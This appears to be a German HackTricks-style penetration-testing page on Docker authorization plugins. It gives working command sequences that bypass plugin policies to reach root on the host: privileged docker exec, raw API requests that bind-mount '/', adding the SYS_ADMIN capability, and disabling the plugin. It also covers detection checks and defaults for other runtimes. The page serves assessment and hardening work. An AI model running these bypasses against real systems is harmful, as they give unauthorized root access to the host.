# Runtime Authorization Plugins

{{#include ../../../banners/hacktricks-training.md}}

## Überblick

Runtime authorization plugins sind eine zusätzliche Policy-Schicht, die entscheidet, ob ein Aufrufer eine bestimmte Daemon-Aktion ausführen darf. Docker ist das klassische Beispiel. Standardmäßig hat jeder, der mit dem Docker-Daemon kommunizieren kann, faktisch weitreichende Kontrolle über ihn. Authorization plugins versuchen, dieses Modell einzuschränken, indem sie den authentifizierten Benutzer und die angeforderte API-Operation prüfen und die Anfrage anschließend gemäß der Policy erlauben oder ablehnen.

Dieses Thema verdient eine eigene Seite, da es das Exploitation-Modell verändert, wenn ein Angreifer bereits Zugriff auf eine Docker API oder auf einen Benutzer in der `docker`-Gruppe hat. In solchen Umgebungen lautet die Frage nicht mehr nur: "Kann ich den Daemon erreichen?", sondern auch: "Ist der Daemon durch eine Authorization-Schicht abgesichert, und kann diese Schicht über nicht behandelte Endpoints, schwaches JSON-Parsing oder Berechtigungen zur Plugin-Verwaltung umgangen werden?"

## Funktionsweise

Wenn eine Anfrage den Docker-Daemon erreicht, kann das Authorization-Subsystem den Anfragekontext an ein oder mehrere installierte Plugins weitergeben. Das Plugin sieht die Identität des authentifizierten Benutzers, die Details der Anfrage, ausgewählte Header sowie Teile des Request- oder Response-Bodys, sofern der Content-Type geeignet ist. Mehrere Plugins können verkettet werden, und der Zugriff wird nur gewährt, wenn alle Plugins die Anfrage erlauben.

Dieses Modell klingt robust, aber seine Sicherheit hängt vollständig davon ab, wie vollständig der Policy-Autor die API verstanden hat. Ein Plugin, das `docker run --privileged` blockiert, aber `docker exec` ignoriert, alternative JSON-Keys wie `Binds` auf Top-Level übersieht oder die Plugin-Administration erlaubt, kann ein falsches Gefühl der Einschränkung erzeugen und dennoch direkte Privilege-Escalation-Pfade offenlassen.

## Häufige Plugin-Ziele

Wichtige Bereiche für ein Policy-Review sind:

- Container-Erstellungs-Endpoints
- `HostConfig`-Felder wie `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` und Optionen zur gemeinsamen Nutzung von Namespaces
- das Verhalten von `docker exec`
- Endpoints zur Plugin-Verwaltung
- jeder Endpoint, der indirekt Runtime-Aktionen außerhalb des vorgesehenen Policy-Modells auslösen kann

Historisch machten Beispiele wie das `authz`-Plugin von Twistlock und einfache Educational-Plugins wie `authobot` dieses Modell leicht untersuchbar, da ihre Policy-Dateien und Codepfade zeigten, wie die Zuordnung von Endpoints zu Aktionen tatsächlich implementiert wurde. Für Assessment-Arbeiten ist die wichtige Erkenntnis, dass der Policy-Autor die vollständige API-Oberfläche verstehen muss und nicht nur die sichtbarsten CLI-Befehle.

## Abuse

Das erste Ziel besteht darin herauszufinden, was tatsächlich blockiert wird. Wenn der Daemon eine Aktion verweigert, leakt der Fehler häufig den Namen des Plugins, wodurch sich die verwendete Kontrolle identifizieren lässt:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Wenn du ein umfassenderes Endpoint-Profiling benötigst, sind Tools wie `docker_auth_profiler` nützlich, da sie die ansonsten repetitive Aufgabe automatisieren, zu prüfen, welche API-Routen und JSON-Strukturen vom Plugin tatsächlich zugelassen werden.

Wenn die Umgebung ein benutzerdefiniertes Plugin verwendet und du mit der API interagieren kannst, ermittle, welche Objektfelder tatsächlich gefiltert werden:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Diese Prüfungen sind wichtig, weil viele Autorisierungsfehler feldspezifisch und nicht konzeptspezifisch sind. Ein Plugin kann ein CLI-Muster ablehnen, ohne die äquivalente API-Struktur vollständig zu blockieren.

### Vollständiges Beispiel: `docker exec` fügt nach der Container-Erstellung Privilegien hinzu

Eine Policy, die die Erstellung privilegierter Container blockiert, aber die Erstellung von unconfined Containern zusammen mit `docker exec` erlaubt, kann dennoch umgangen werden:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Wenn der daemon den zweiten Schritt akzeptiert, hat der Benutzer einen privilegierten interaktiven Prozess innerhalb eines Containers wiedererlangt, von dem der Autor der Policy glaubte, dass er eingeschränkt sei.

### Vollständiges Beispiel: Bind Mount über Raw API

Einige fehlerhafte Policies prüfen nur eine JSON-Form. Wenn der Bind Mount des Root-Dateisystems nicht konsistent blockiert wird, kann der Host weiterhin gemountet werden:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Dieselbe Idee kann auch unter `HostConfig` auftreten:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Die Auswirkung ist ein vollständiger Escape aus dem Host-Dateisystem. Das interessante Detail ist, dass der Bypass durch eine unvollständige Policy-Abdeckung und nicht durch einen Kernel-Bug entsteht.

### Vollständiges Beispiel: Ungeprüftes Capability-Attribut

Wenn die Policy vergisst, ein Capability-bezogenes Attribut zu filtern, kann der Angreifer einen Container erstellen, der eine gefährliche Capability zurückerlangt:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Sobald `CAP_SYS_ADMIN` oder eine ähnlich starke Capability vorhanden ist, werden viele in [capabilities.md](protections/capabilities.md) und [privileged-containers.md](privileged-containers.md) beschriebenen Breakout-Techniken erreichbar.

### Vollständiges Beispiel: Deaktivieren des Plugins

Wenn Plugin-Management-Operationen erlaubt sind, besteht der sauberste Bypass möglicherweise darin, die Kontrolle vollständig zu deaktivieren:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Dies ist ein Policy-Fehler auf Control-Plane-Ebene. Die Autorisierungsschicht ist vorhanden, aber der Benutzer, den sie eigentlich einschränken sollte, verfügt weiterhin über die Berechtigung, sie zu deaktivieren.

## Prüfungen

Diese Befehle dienen dazu festzustellen, ob eine Policy-Schicht vorhanden ist und ob sie vollständig oder nur oberflächlich implementiert zu sein scheint.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Was ist hier interessant:

- Denial messages, die einen plugin name enthalten, bestätigen eine authorization layer und verraten oft die genaue Implementierung.
- Eine für den Angreifer sichtbare plugin list kann ausreichen, um festzustellen, ob disable- oder reconfigure-Operationen möglich sind.
- Eine policy, die nur offensichtliche CLI actions blockiert, aber keine raw API requests, sollte als bypassable betrachtet werden, bis das Gegenteil bewiesen ist.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig nicht aktiviert | Der Zugriff auf den Daemon ist effektiv all-or-nothing, sofern kein authorization plugin konfiguriert ist | unvollständige plugin policy, blacklists statt allowlists, das Zulassen von plugin management, Blind Spots auf Feldebene |
| Podman | Kein gängiges direktes Äquivalent | Podman stützt sich typischerweise eher auf Unix permissions, rootless execution und Entscheidungen zur API exposure als auf Docker-ähnliche authz plugins | eine rootful Podman API umfassend exponieren, schwache socket permissions |
| containerd / CRI-O | Anderes control model | Diese runtimes stützen sich normalerweise eher auf socket permissions, node trust boundaries und controls des übergeordneten orchestrators als auf Docker authz plugins | den socket in workloads mounten, schwache node-lokale trust assumptions |
| Kubernetes | Verwendet authn/authz auf den API-server- und kubelet-Ebenen, nicht Docker authz plugins | Cluster RBAC und admission controls sind die zentrale policy layer | übermäßig weitreichendes RBAC, schwache admission policy, kubelet- oder runtime APIs direkt exponieren |
{{#include ../../../banners/hacktricks-training.md}}
